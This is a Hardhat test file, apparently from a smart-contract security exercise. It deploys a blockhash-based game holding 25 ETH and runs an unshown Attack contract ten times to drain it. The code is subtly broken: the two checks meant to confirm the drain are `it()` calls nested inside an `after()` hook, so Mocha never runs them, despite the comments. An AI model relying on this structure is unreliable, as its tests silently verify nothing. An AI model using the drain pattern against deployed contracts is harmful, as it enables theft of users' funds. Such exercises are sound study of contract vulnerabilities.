// Import necessary libraries.
// We are using ethers for Ethereum and Solidity related functionality
// and chai library for writing tests.
const { ethers } = require("hardhat");
const { expect } = require("chai");

// We're testing a potential vulnerability in the RandomBlockhash contract.
describe("Random Blockhash Testing Suite", function () {
  // Define initial states for the actors and the game's parameters.
  // 'deployer' and 'attacker' are the two players in this game.
  // 'INITIAL_POT' is the initial amount of Ether in the contract,
  // and 'GAME_FEE' is the fee to play the game.
  let deployer, attacker;
  const INITIAL_POT = ethers.utils.parseEther("25");
  const GAME_FEE = ethers.utils.parseEther("1");

  // Before running the tests, we perform some setup operations.
  // Here we obtain the signers for the deployer and attacker accounts,
  // and check the attacker's initial balance.
  before(async function () {
    [deployer, attacker] = await ethers.getSigners();
    this.attackerInitialBalance = await ethers.provider.getBalance(
      attacker.address
    );
    // We get the contract factory for the RandomBlockhash game,
    // which enables us to deploy the contract later.
    const gameFactory = await ethers.getContractFactory(
      "./RandomBlockhash.sol:RandomBlockhash",
      deployer
    );

    // Using the factory, we deploy the contract and store the instance of the contract in 'this.game'
    this.game = await gameFactory.deploy({ value: INITIAL_POT });

    // After deploying the game contract, we check the balance to ensure
    // that the initial Ether amount is correctly set to 'INITIAL_POT'.
    let inGame = await ethers.provider.getBalance(this.game.address);
    expect(inGame).to.equal(INITIAL_POT);
  });

  // The exploit function is where the attack on the contract happens.
  // This will be run after the setup (before function).
  it("[Test I] Should launch the attack on the RandomBlockhash contract", async function () {
    // We get the contract factory for the attacker,
    // which enables us to deploy the contract later.
    const attackGameFactory = await ethers.getContractFactory(
      "./Attack.sol:Attack",
      attacker
    );
    // Using the factory, we deploy the contract and store the instance of the contract in 'this.attackerContract'.
    this.attackerContract = await attackGameFactory.deploy(this.game.address);
    // The attacker will run the playtoWin function 10 times in the hope to win the game.
    // In each iteration, we console log the round number for clarity.
    for (let i = 0; i < 10; i++) {
      console.log(`Round ${i}`);
      await (await this.attackerContract.playtoWin({ value: GAME_FEE })).wait();
    }
  });

  // The after function runs after all the tests in this block.
  // It allows us to clean up any resources and check final conditions.
  // Here we're checking if the exploit was successful.
  after(async function () {
    // Test case II checks if the attacker managed to drain all funds from the game contract.
    it("[Test II] Should verify that all funds have been drained from the RandomBlockhash contract", async function () {
      expect(await ethers.provider.getBalance(this.game.address)).to.equal(0);
    });

    // Test case III checks if the attacker's balance is greater than their initial balance plus the game pot,
    // subtracting a small amount for gas costs. This verifies that the attacker has indeed profited from the attack.
    it("[Test III] Should verify that the attacker's balance has increased beyond initial balance and game pot", async function () {
      expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
        this.attackerInitialBalance
          .add(INITIAL_POT)
          .sub(ethers.utils.parseEther("0.2"))
      );
    });
  });
});
